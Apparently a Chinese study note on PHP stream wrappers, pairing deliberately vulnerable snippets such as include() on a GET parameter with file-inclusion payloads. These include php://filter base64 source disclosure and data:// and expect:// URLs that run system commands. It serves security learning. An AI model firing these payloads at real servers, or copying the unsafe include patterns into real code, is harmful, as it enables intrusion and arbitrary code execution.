#知识点
php封装协议小总结
http://blog.csdn.net/niexinming/article/details/52605144
#实例
##php://stdin
主要用于php cli 的输入

应用：

    <?  
    while($line = fopen('php://stdin','r')){  
        echo fgets($line);  
    }  
    ?>  


##php://stdout

主要用于php cli的输出

应用：

    <?php  
    $fh = fopen('php://stdout', 'w');  
    fwrite($fh, "标准输出php://stdout\n");  
    fclose($fh);  
    fwrite(STDOUT, "标准输出STDOUT\n");  
    ?>  

##php://input

可以读取到post没有解析的原始数据

php代码

    <?php  
     echo file_get_contents($_GET["a"]);  
    ?>  

浏览器访问：http://www.test.com/index.php?a=php://input
	POST：fo=test

当php代码这样写的时候：

    <?php  
    $code = $_GET['a'];  
    include($code);  
    ?>  
并且当php远程包含打开的时候（当allow_url_include=on),就可以造成任意代码执行

##php://output

是一个只写数据流，允许你以print和echo一样的方式写入到输出缓冲区。

当代码是：

    <?php  
     $code=$_GET["a"];  
     file_put_contents($code,"test");   
    ?>  

当访问参数是php://output时，则在此页面输出test

##php://filter

是一种元封装器，设计用于数据流打开时的筛选过滤应用

1. 当php代码是：  

	    <?php  
	    $filename=$_GET["a"];  
	    $data="test test";  
	    file_put_contents($filename, $data);  
	    ?>  

	- 通过访问<http://localhost:8000/phpinput.php?a=php://filter/write=string.tolower/resource=test.php>
	可以往服务器中写入一个文件内容全为小写且文件名为test.php的文件：
	其中 ：
	（1）string.tolower //写入内容全部变成小写
	（2）string.toupper //写入内容全部变成大写
	（3）string.rot13 //写入内容全部对字符串执行 ROT13 编码
	
	- 通过访问：<http://localhost:8000/phpinput.php?a=php://filter/convert.base64-encode/resource=test.php>
	可以往服务器中写入一个文件内容为base64编码且文件名为test.php的文件：

2. 当代码为：

	    <?php  
	    $filename=$_GET["a"];  
	    echo file_get_contents($filename);  
	    ?>  

	- 通过访问：<http://localhost:8000/phpinput.php?a=php://filter/convert.base64-encode/resource=test.php>就可以把test.php的内容以base64编码的方式显示出来

3. 当代码为：

	    <?php  
	    $filename=$_GET["a"];  
	    $data="test test";  
	    include("$filename");  
	    ?>  

	- 通过访问：http://localhost:8000/phpinput.php?a=php://filter/convert.base64-encode/resource=test.php同样可以把test.php的内容以base64编码的方式显示出来

	这里注意：双引号包含的变量$filename，可以当成正常变量执行，而单引号包裹的变量则会当成字符串例如：

		$aa='1';
		echo “$aa”;
		echo '$aa';

##expect://
可以用这个协议执行任意linux的指令

    <?php  
    $code = $_GET['hax'];  
    include($code);  
    ?>  

那么可以用http://localhost/test.php?hax=expect://command 来执行任意linux指令
  
	Note:该封装协议默认未开启  
	为了使用 expect:// 封装器，你必须安装» PECL 上的 » Expect扩展。
	我安装这个拓展屡屡失败，看来不是特殊需求是不会有这样的漏洞的，这里只提个思路
	如果看效果可以去看看这个博客的文章：http://insecurety.net/?p=724

##data://
数据流封装器  
当allow_url_include 打开的时候，任意文件包含就会成为任意代码执行
  
php的代码是：

    <?php  
    $filename=$_GET["a"];  
    include("$filename");  
    ?>  

当访问这样的链接的时候执行系统命令：
[http://localhost:8000/phpinput.php?a=data:text/plain,<?php system('ls')?>]()
